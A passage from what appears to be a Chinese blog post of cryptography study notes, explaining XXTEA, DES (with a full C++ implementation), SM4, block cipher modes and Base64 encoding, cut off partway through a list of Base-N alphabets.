punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>      <span class="token class-name">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token class-name">uint32_t</span> <span class="token keyword">const</span> k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> n<span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">//n的绝对值表示v的长度，取正表示加密，取负表示解密  </span>    <span class="token comment">// v为要加密的数据是两个32位无符号整数  </span>    <span class="token comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  </span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密前原始数据：%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">btea</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> n<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后的数据：%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">btea</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token operator">-</span>n<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后的数据：%u %u\n"</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="DES加密算法"><a href="#DES加密算法" class="headerlink" title="DES加密算法"></a>DES加密算法</h4><ol><li>原理<br>利用一些简单的密码变换，如：代换、置换、加减等设计出一个圈函数f，并通过将他多次迭代的方法，产生的一个分组密码算法  </li><li>基本参数<br>分组长度：64bit<br>密钥长度：64bit<br>有效密钥长度：56bit(每8bit的最高位是校验码，检验错误)<br>迭代的圈数：16圈<br>圈密钥的长度：48bit  </li><li>加密完整的流程图<br><img src="/2021/120547052/36.png" alt=" ">  </li><li>解析  </li></ol><ul><li>初始置换IP和逆初始置换IP-1<br><img src="/2021/120547052/37.png" alt=" "><br>其中：初始置换中的数字序号代表的是最初给定的数字的序号，而逆初始置换中的数字是经过一系列操作之后现在得到的结果进行从开始进行从新排序之后的数字编号  </li><li>迭代16圈<br>前15圈的算法结构可以表示为：(Li,Ri)=(Ri-1,Li-1⊕f(Ri-1, Ki))<br>第16圈的算法结构可以表示为：(L16,R16)=(L15⊕f(R15,K16),R16)  </li><li>f函数解析  </li></ul><ol><li>f函数图解<br><img src="/2021/120547052/38.png" alt=" ">  </li><li>E盒扩展<br>目的：将输入的32bit数据扩展为48bit数据<br><img src="/2021/120547052/39.png" alt=" "><br>扩展方式解析：(1) 将输入的32比特每4比特为一组分为8块;<br>（2）分别将第m-1块的最右比特和第m+1块的最左比特添到第m块的左边和右边,形成输出的第k个6比特块  </li><li>S盒代换<br>目的：将输入的48bit数据压缩为32bit数据<br><img src="/2021/120547052/40.png" alt=" "><br>举例：<br><img src="/2021/120547052/41.png" alt=" ">  </li><li>P盒变换<br>目的：对S盒变换后的32比特数据的位置进行移动<br><img src="/2021/120547052/42.png" alt=" "><br>特点：（1）P盒的各输入块的4个比特都分配到不同的输出块之中<br>（2）P盒的各输出块的4个比特都来自不同的输入块<br>（3）P盒的第t输出块的4个比特都不来自第t输入块  </li></ol><ul><li>DES的圈密钥生成算法  </li></ul><ol><li>圈密钥生成算法图解<br><img src="/2021/120547052/43.png" alt=" ">  </li><li>置换选择1<br><img src="/2021/120547052/44.png" alt=" "><br>其中：将每8个bit的最高位的检验位去除，之后按照图表进行排序  </li><li>置换选择2<br><img src="/2021/120547052/45.png" alt=" "><br>其中：该序号时将进行操作之后的数据从新编号之后，按图表编号在取出数据  </li><li>移位情况<br><img src="/2021/120547052/46.png" alt=" ">  </li></ol><ul><li>解密情况<br>解密和加密的算法结构完全相同<br>密钥顺序相反  </li><li>加密解密算法  </li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;*************************************************************************    &gt; File Name: Des.cpp    &gt; Author: SongLee    &gt; E-mail: lisong.shine@qq.com    &gt; Created Time: 2014年06月01日 星期日 19时46分32秒    &gt; Personal Blog: http:&#x2F;&#x2F;songlee24.github.com************************************************************************&#x2F;#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;bitset&gt;#include &lt;string&gt;using namespace std;bitset&lt;64&gt; key;                &#x2F;&#x2F; 64位密钥bitset&lt;48&gt; subKey[16];         &#x2F;&#x2F; 存放16轮子密钥&#x2F;&#x2F; 初始置换表int IP[] &#x3D; &#123;58, 50, 42, 34, 26, 18, 10, 2,            60, 52, 44, 36, 28, 20, 12, 4,            62, 54, 46, 38, 30, 22, 14, 6,            64, 56, 48, 40, 32, 24, 16, 8,            57, 49, 41, 33, 25, 17, 9,  1,            59, 51, 43, 35, 27, 19, 11, 3,            61, 53, 45, 37, 29, 21, 13, 5,            63, 55, 47, 39, 31, 23, 15, 7&#125;;&#x2F;&#x2F; 结尾置换表int IP_1[] &#x3D; &#123;40, 8, 48, 16, 56, 24, 64, 32,            39, 7, 47, 15, 55, 23, 63, 31,            38, 6, 46, 14, 54, 22, 62, 30,            37, 5, 45, 13, 53, 21, 61, 29,            36, 4, 44, 12, 52, 20, 60, 28,            35, 3, 43, 11, 51, 19, 59, 27,            34, 2, 42, 10, 50, 18, 58, 26,            33, 1, 41,  9, 49, 17, 57, 25&#125;;&#x2F;*------------------下面是生成密钥所用表-----------------*&#x2F;&#x2F;&#x2F; 密钥置换表，将64位密钥变成56位int PC_1[] &#x3D; &#123;57, 49, 41, 33, 25, 17, 9,            1, 58, 50, 42, 34, 26, 18,            10,  2, 59, 51, 43, 35, 27,            19, 11,  3, 60, 52, 44, 36,            63, 55, 47, 39, 31, 23, 15,            7, 62, 54, 46, 38, 30, 22,            14,  6, 61, 53, 45, 37, 29,            21, 13,  5, 28, 20, 12,  4&#125;;&#x2F;&#x2F; 压缩置换，将56位密钥压缩成48位子密钥int PC_2[] &#x3D; &#123;14, 17, 11, 24,  1,  5,            3, 28, 15,  6, 21, 10,            23, 19, 12,  4, 26,  8,            16,  7, 27, 20, 13,  2,            41, 52, 31, 37, 47, 55,            30, 40, 51, 45, 33, 48,            44, 49, 39, 56, 34, 53,            46, 42, 50, 36, 29, 32&#125;;&#x2F;&#x2F; 每轮左移的位数int shiftBits[] &#x3D; &#123;1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1&#125;;&#x2F;*------------------下面是密码函数 f 所用表-----------------*&#x2F;&#x2F;&#x2F; 扩展置换表，将 32位 扩展至 48位int E[] &#x3D; &#123;32,  1,  2,  3,  4,  5,            4,  5,  6,  7,  8,  9,            8,  9, 10, 11, 12, 13,        12, 13, 14, 15, 16, 17,        16, 17, 18, 19, 20, 21,        20, 21, 22, 23, 24, 25,        24, 25, 26, 27, 28, 29,        28, 29, 30, 31, 32,  1&#125;;&#x2F;&#x2F; S盒，每个S盒是4x16的置换表，6位 -&gt; 4位int S_BOX[8][4][16] &#x3D; &#123;    &#123;        &#123;14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7&#125;,        &#123;0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8&#125;,        &#123;4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0&#125;,        &#123;15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13&#125;    &#125;,    &#123;        &#123;15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10&#125;,        &#123;3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5&#125;,        &#123;0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15&#125;,        &#123;13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9&#125;    &#125;,    &#123;        &#123;10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8&#125;,        &#123;13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1&#125;,        &#123;13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7&#125;,        &#123;1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12&#125;    &#125;,    &#123;        &#123;7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15&#125;,        &#123;13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9&#125;,        &#123;10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4&#125;,        &#123;3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14&#125;    &#125;,    &#123;        &#123;2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9&#125;,        &#123;14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6&#125;,        &#123;4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14&#125;,        &#123;11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3&#125;    &#125;,    &#123;        &#123;12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11&#125;,        &#123;10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8&#125;,        &#123;9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6&#125;,        &#123;4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13&#125;    &#125;,    &#123;        &#123;4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1&#125;,        &#123;13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6&#125;,        &#123;1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2&#125;,        &#123;6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12&#125;    &#125;,    &#123;        &#123;13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7&#125;,        &#123;1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2&#125;,        &#123;7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8&#125;,        &#123;2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11&#125;    &#125;&#125;;&#x2F;&#x2F; P置换，32位 -&gt; 32位int P[] &#x3D; &#123;16,  7, 20, 21,        29, 12, 28, 17,            1, 15, 23, 26,            5, 18, 31, 10,            2,  8, 24, 14,        32, 27,  3,  9,        19, 13, 30,  6,        22, 11,  4, 25 &#125;;&#x2F;**********************************************************************&#x2F;&#x2F;*                                                                    *&#x2F;&#x2F;*                            下面是DES算法实现                         *&#x2F;&#x2F;*                                                                    *&#x2F;&#x2F;**********************************************************************&#x2F;&#x2F;***  密码函数f，接收32位数据和48位子密钥，产生一个32位的输出*&#x2F;bitset&lt;32&gt; f(bitset&lt;32&gt; R, bitset&lt;48&gt; k)&#123;    bitset&lt;48&gt; expandR;    &#x2F;&#x2F; 第一步：扩展置换，32 -&gt; 48    for(int i&#x3D;0; i&lt;48; ++i)        expandR[47-i] &#x3D; R[32-E[i]];    &#x2F;&#x2F; 第二步：异或    expandR &#x3D; expandR ^ k;    &#x2F;&#x2F; 第三步：查找S_BOX置换表    bitset&lt;32&gt; output;    int x &#x3D; 0;    for(int i&#x3D;0; i&lt;48; i&#x3D;i+6)    &#123;        int row &#x3D; expandR[47-i]*2 + expandR[47-i-5];        int col &#x3D; expandR[47-i-1]*8 + expandR[47-i-2]*4 + expandR[47-i-3]*2 + expandR[47-i-4];        int num &#x3D; S_BOX[i&#x2F;6][row][col];        bitset&lt;4&gt; binary(num);        output[31-x] &#x3D; binary[3];        output[31-x-1] &#x3D; binary[2];        output[31-x-2] &#x3D; binary[1];        output[31-x-3] &#x3D; binary[0];        x +&#x3D; 4;    &#125;    &#x2F;&#x2F; 第四步：P-置换，32 -&gt; 32    bitset&lt;32&gt; tmp &#x3D; output;    for(int i&#x3D;0; i&lt;32; ++i)        output[31-i] &#x3D; tmp[32-P[i]];    return output;&#125;&#x2F;***  对56位密钥的前后部分进行左移*&#x2F;bitset&lt;28&gt; leftShift(bitset&lt;28&gt; k, int shift)&#123;    bitset&lt;28&gt; tmp &#x3D; k;    for(int i&#x3D;27; i&gt;&#x3D;0; --i)    &#123;        if(i-shift&lt;0)            k[i] &#x3D; tmp[i-shift+28];        else            k[i] &#x3D; tmp[i-shift];    &#125;    return k;&#125;&#x2F;***  生成16个48位的子密钥*&#x2F;void generateKeys()&#123;    bitset&lt;56&gt; realKey;    bitset&lt;28&gt; left;    bitset&lt;28&gt; right;    bitset&lt;48&gt; compressKey;    &#x2F;&#x2F; 去掉奇偶标记位，将64位密钥变成56位    for (int i&#x3D;0; i&lt;56; ++i)        realKey[55-i] &#x3D; key[64 - PC_1[i]];    &#x2F;&#x2F; 生成子密钥，保存在 subKeys[16] 中    for(int round&#x3D;0; round&lt;16; ++round)    &#123;        &#x2F;&#x2F; 前28位与后28位        for(int i&#x3D;28; i&lt;56; ++i)            left[i-28] &#x3D; realKey[i];        for(int i&#x3D;0; i&lt;28; ++i)            right[i] &#x3D; realKey[i];        &#x2F;&#x2F; 左移        left &#x3D; leftShift(left, shiftBits[round]);        right &#x3D; leftShift(right, shiftBits[round]);        &#x2F;&#x2F; 压缩置换，由56位得到48位子密钥        for(int i&#x3D;28; i&lt;56; ++i)            realKey[i] &#x3D; left[i-28];        for(int i&#x3D;0; i&lt;28; ++i)            realKey[i] &#x3D; right[i];        for(int i&#x3D;0; i&lt;48; ++i)            compressKey[47-i] &#x3D; realKey[56 - PC_2[i]];        subKey[round] &#x3D; compressKey;    &#125;&#125;&#x2F;***  工具函数：将char字符数组转为二进制*&#x2F;bitset&lt;64&gt; charToBitset(const char s[8])&#123;    bitset&lt;64&gt; bits;    for(int i&#x3D;0; i&lt;8; ++i)        for(int j&#x3D;0; j&lt;8; ++j)            bits[i*8+j] &#x3D; ((s[i]&gt;&gt;j) &amp; 1);    return bits;&#125;&#x2F;***  DES加密*&#x2F;bitset&lt;64&gt; encrypt(bitset&lt;64&gt;&amp; plain)&#123;    bitset&lt;64&gt; cipher;    bitset&lt;64&gt; currentBits;    bitset&lt;32&gt; left;    bitset&lt;32&gt; right;    bitset&lt;32&gt; newLeft;    &#x2F;&#x2F; 第一步：初始置换IP    for(int i&#x3D;0; i&lt;64; ++i)        currentBits[63-i] &#x3D; plain[64-IP[i]];    &#x2F;&#x2F; 第二步：获取 Li 和 Ri    for(int i&#x3D;32; i&lt;64; ++i)        left[i-32] &#x3D; currentBits[i];    for(int i&#x3D;0; i&lt;32; ++i)        right[i] &#x3D; currentBits[i];    &#x2F;&#x2F; 第三步：共16轮迭代    for(int round&#x3D;0; round&lt;16; ++round)    &#123;        newLeft &#x3D; right;        right &#x3D; left ^ f(right,subKey[round]);        left &#x3D; newLeft;    &#125;    &#x2F;&#x2F; 第四步：合并L16和R16，注意合并为 R16L16    for(int i&#x3D;0; i&lt;32; ++i)        cipher[i] &#x3D; left[i];    for(int i&#x3D;32; i&lt;64; ++i)        cipher[i] &#x3D; right[i-32];    &#x2F;&#x2F; 第五步：结尾置换IP-1    currentBits &#x3D; cipher;    for(int i&#x3D;0; i&lt;64; ++i)        cipher[63-i] &#x3D; currentBits[64-IP_1[i]];    &#x2F;&#x2F; 返回密文    return cipher;&#125;&#x2F;***  DES解密*&#x2F;bitset&lt;64&gt; decrypt(bitset&lt;64&gt;&amp; cipher)&#123;    bitset&lt;64&gt; plain;    bitset&lt;64&gt; currentBits;    bitset&lt;32&gt; left;    bitset&lt;32&gt; right;    bitset&lt;32&gt; newLeft;    &#x2F;&#x2F; 第一步：初始置换IP    for(int i&#x3D;0; i&lt;64; ++i)        currentBits[63-i] &#x3D; cipher[64-IP[i]];    &#x2F;&#x2F; 第二步：获取 Li 和 Ri    for(int i&#x3D;32; i&lt;64; ++i)        left[i-32] &#x3D; currentBits[i];    for(int i&#x3D;0; i&lt;32; ++i)        right[i] &#x3D; currentBits[i];    &#x2F;&#x2F; 第三步：共16轮迭代（子密钥逆序应用）    for(int round&#x3D;0; round&lt;16; ++round)    &#123;        newLeft &#x3D; right;        right &#x3D; left ^ f(right,subKey[15-round]);        left &#x3D; newLeft;    &#125;    &#x2F;&#x2F; 第四步：合并L16和R16，注意合并为 R16L16    for(int i&#x3D;0; i&lt;32; ++i)        plain[i] &#x3D; left[i];    for(int i&#x3D;32; i&lt;64; ++i)        plain[i] &#x3D; right[i-32];    &#x2F;&#x2F; 第五步：结尾置换IP-1    currentBits &#x3D; plain;    for(int i&#x3D;0; i&lt;64; ++i)        plain[63-i] &#x3D; currentBits[64-IP_1[i]];    &#x2F;&#x2F; 返回明文    return plain;&#125;&#x2F;**********************************************************************&#x2F;&#x2F;* 测试：                                                             *&#x2F;&#x2F;*     1.将一个 64 位的字符串加密， 把密文写入文件 a.txt                  *&#x2F;&#x2F;*     2.读取文件 a.txt 获得 64 位密文，解密之后再写入 b.txt              *&#x2F;&#x2F;**********************************************************************&#x2F;int main() &#123;    string s &#x3D; &quot;romantic&quot;;    string k &#x3D; &quot;12345678&quot;;    bitset&lt;64&gt; plain &#x3D; charToBitset(s.c_str());    key &#x3D; charToBitset(k.c_str());    &#x2F;&#x2F; 生成16个子密钥    generateKeys();    &#x2F;&#x2F; 密文写入 a.txt    bitset&lt;64&gt; cipher &#x3D; encrypt(plain);    fstream file1;    file1.open(&quot;D:&#x2F;&#x2F;a.txt&quot;, ios::binary | ios::out);    file1.write((char*)&amp;cipher,sizeof(cipher));    file1.close();    &#x2F;&#x2F; 读文件 a.txt    bitset&lt;64&gt; temp;    file1.open(&quot;D:&#x2F;&#x2F;a.txt&quot;, ios::binary | ios::in);    file1.read((char*)&amp;temp, sizeof(temp));    file1.close();    &#x2F;&#x2F; 解密，并写入文件 b.txt    bitset&lt;64&gt; temp_plain &#x3D; decrypt(temp);    file1.open(&quot;D:&#x2F;&#x2F;b.txt&quot;, ios::binary | ios::out);    file1.write((char*)&amp;temp_plain,sizeof(temp_plain));    file1.close();    return 0;&#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="SM4加密算法"><a href="#SM4加密算法" class="headerlink" title="SM4加密算法"></a>SM4加密算法</h4><ol><li><p>加密解密流程图如下：<br><img src="/2021/120547052/52.png" alt=" ">  </p></li><li><p>加密  </p></li></ol><ul><li>输入的明文为 128bit 的数据将其按位拆分成 4 个 32bit 的数据x0,x1,x2,x3，当i=0 时为第一次轮变换，一直进行到 i=31 结束  </li><li>xi  暂时不做处理，将 xi+1,xi+2,xi+3 和轮密钥 rki 异或得到一个 32bit 的数据，作为盒变换的输入<br>即 sbox_input=xi+1⊕xi+2⊕xi+3⊕rki，⊕ 符号代表异或运算  </li><li>将 sbox_input 拆分成 4 个 8bit 数据，分别进行盒变换，之后再将 4 个 8bit 输出合并成一个 32bit 的 sbox_output  </li><li>将刚才获得的 sbox_output 分别循环左移 2，10，18，24 位，得到 4 个 32bit 的结果，记移位结果为 y2,y10,y18,y24  </li><li>将移位的结果 y2,y10,y18,y24 与盒变换输出 sbox_output 和 xi 异或，得到 xi+4<br>即 xi+4=sbox_output⊕y2⊕y10⊕y18⊕y24⊕xi  </li><li>至此完成了一轮的加解密运算<br>在实际加解密过程中，上述运算要执行 32 轮，同时使用 32 个不同的 rki，rki 由密钥拓展生成  </li><li>最后将生成的最后 4 个 32bit 数据 x35,x34,x33,x32 合并成一个 128bit 的数据 output，作为最后的输出结果<br>其中的盒变换的盒子如下图<br><img src="/2021/120547052/49.png" alt=" ">  </li></ul><ol><li>密钥拓展  </li></ol><ul><li>输入的原始密钥 key 为 128bit 的数据，将其按位拆分成 4 个 32bit 的数据 K0,K1,K2,K3  </li><li>将初始密钥 K0,K1,K2,K3 分别异或固定参数 FK0,FK1,FK2,FK3 得到用于循环的密钥 k0,k1,k2,k3<br>即 k0=K0⊕FK0,k1=K1⊕FK1,k2=K2⊕FK2,k3=K3⊕FK3  </li><li>进入轮密钥 rki 的生成<br>当 i=0 时为第一次轮变换，一直进行到 i=31 结束  </li><li>ki  暂时不做处理，将 ki+1,ki+2,ki+3 和固定参数 CKi 异或得到一个 32bit 的数据，作为盒变换的输入<br>即 sbox_input=ki+1⊕ki+2⊕ki+3⊕cki  </li><li>将 sbox_input 拆分成 4 个 8bit 数据，分别进行盒变换，之后再将 4 个 8bit 输出合并成一个 32bit 的 sbox_output  </li><li>将刚才获得的 sbox_output 分别循环左移 13，23 位，得到 2 个 32bit 的结果，记移位结果为 y13,y23  </li><li>将移位的结果 y13,y23 与盒变换输出 sbox_output 和 ki 异或，得到 ki+4<br>即 rki=ki+4=sbox_output⊕y13⊕y23⊕ki  </li><li>至此完成了一轮的加解密运算<br>在实际加解密过程中，上述运算要执行 32 轮，同时使用 32 个不同的 CKi，CKi 为固定参数  </li><li>执行完 32 轮后，便可获得 32 个用于加解密的 rki<br>其中要用的盒子上面有，CK和FK如下图<br>FK：<br><img src="/2021/120547052/50.png" alt=" "><br>CK:<br><img src="/2021/120547052/51.png" alt=" ">  </li></ul><h3 id="分组密码的工作模式"><a href="#分组密码的工作模式" class="headerlink" title="分组密码的工作模式"></a>分组密码的工作模式</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ol><li>分组密码的工作模式是指以这个分组密码为基础通过某种方式构造一个分组密码系统，以解决对任意长度明文的加密问题  </li></ol><h4 id="1电码本-ECB-模式"><a href="#1电码本-ECB-模式" class="headerlink" title="1电码本(ECB)模式"></a>1电码本(ECB)模式</h4><ol><li>ECB 模式是直接使用分组密码的工作模式，明文的各个分组独立地使用同一密钥 k 加密  </li><li>加解密框图如下：<br><img src="/2021/120547052/53.png" alt=" ">  </li><li>分组短块<br>直接扩充法–直接补0或者其他固定bit–添加随机数(填充的最好是可以识别身份的)<br>密文挪用法–从最后的密文开始在最后进行填充  </li></ol><h4 id="密码分组链接-CBC-模式"><a href="#密码分组链接-CBC-模式" class="headerlink" title="密码分组链接(CBC)模式"></a>密码分组链接(CBC)模式</h4><ol><li>加密<br><img src="/2021/120547052/54.png" alt=" ">  </li><li>解密<br><img src="/2021/120547052/55.png" alt=" ">  </li></ol><h4 id="密码反馈-CFB-模式"><a href="#密码反馈-CFB-模式" class="headerlink" title="密码反馈(CFB)模式"></a>密码反馈(CFB)模式</h4><ol><li>加密<br><img src="/2021/120547052/56.png" alt=" ">  </li><li>解密<br><img src="/2021/120547052/57.png" alt=" ">  </li></ol><h4 id="输出反馈-OFB-模式"><a href="#输出反馈-OFB-模式" class="headerlink" title="输出反馈(OFB)模式"></a>输出反馈(OFB)模式</h4><ol><li>加密<br><img src="/2021/120547052/58.png" alt=" ">  </li><li>解密<br><img src="/2021/120547052/59.png" alt=" ">  </li></ol><h4 id="计数器-CTR-模式"><a href="#计数器-CTR-模式" class="headerlink" title="计数器(CTR)模式"></a>计数器(CTR)模式</h4><ol><li>原理：利用固定密钥k对自然数序列1,2,3,…,n, …加密，将得到的密文分组序列看作乱数序列。按加减密码的方式与明文分组逐位模2加的一种方式  </li></ol><h2 id="其他密码学"><a href="#其他密码学" class="headerlink" title="其他密码学"></a>其他密码学</h2><h3 id="base加密"><a href="#base加密" class="headerlink" title="base加密"></a>base加密</h3><ol><li><p>原理<br>a. 将三个八位的字节转化为四个六位的字节，不足补零。它是用64个可打印字符表示二进制所有数据方法。由于2的6次方等于64，所以可以用每6个位元为一个单元，对应某个可打印字符。我们知道三个字节有24个位元，就可以刚好对应于4个Base64单元，即3个字节需要用4个Base64的可打印字符来表示。在Base64中的可打印字符包括字母A-Z、a-z、数字0-9 ，这样共有62个字符，此外两个可打印符号在不同的系统中一般有所不同。但是，我们经常所说的Base64另外2个字符是：“+/”。这64个字符，所对应的索引表如下(索引号不是对应的ascii值)：<br><img src="/2021/120547052/11.png" alt=" "><br>b. 转换的时候，将三个byte的数据，先后放入一个24bit的缓冲区中，先来的byte占高位。数据不足3byte的话，于缓冲区中剩下的bit用0补足。然后，每次取出6个bit，按照其值选择<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code>中的字符作为编码后的输出。不断进行，直到全部输入数据转换完成。所以加密后的数据量是原来的4/3。<br>c. 但转换的字节数不一定就是24的整数倍，会出现有多余不足六位的情况，在base64中处理的方法是加零凑够六位，但是这样一来在解码的时候就会出现多余的位，这该怎么办呢？ 不用担心，base64想到了一个很好的解决办法。<br>​d. 这个办法就是在base64凑零的同时，还要满足凑出来的位数是8的倍数，不然就加一个或者两个特殊的六位=符号。为什么是一个或者两个=符号呢？因为多个8位转为6位 只会出现剩余2位、4位的情况，剩余2位时只需要一个表示六位的=便可变为8的整数；而剩余4位 需要两个表示6位的=便可以变为8的整数。然后在解密的时候不解析=即可。<br>​之所以位的总数需要凑成8的倍数，是因为base64主要用于加密后的数据传送，而在传送机制中都认为传送的最小单位是按照字节算的，所以不能出现不是位总数不是8的倍数的情况，在接收到数据后，按顺序将6位的base64直接按照顺序解密成字节就完成解密了。<br><img src="/2021/120547052/12.png" alt=" ">  </p></li><li><p>base加密系列字母表  </p></li><li><p><strong>base16：0到9，A到F<a href="https://www.qqxiuzi.cn/bianma/base.php?type=16">在线解密</a></strong>  </p></li><li><p><strong>base32：A到Z，2到7<a href="https://www.qqxiuzi.cn/bianma/base.php">在线解密</a></strong>  </p></li><li><p>base36：0到9，a到z<a 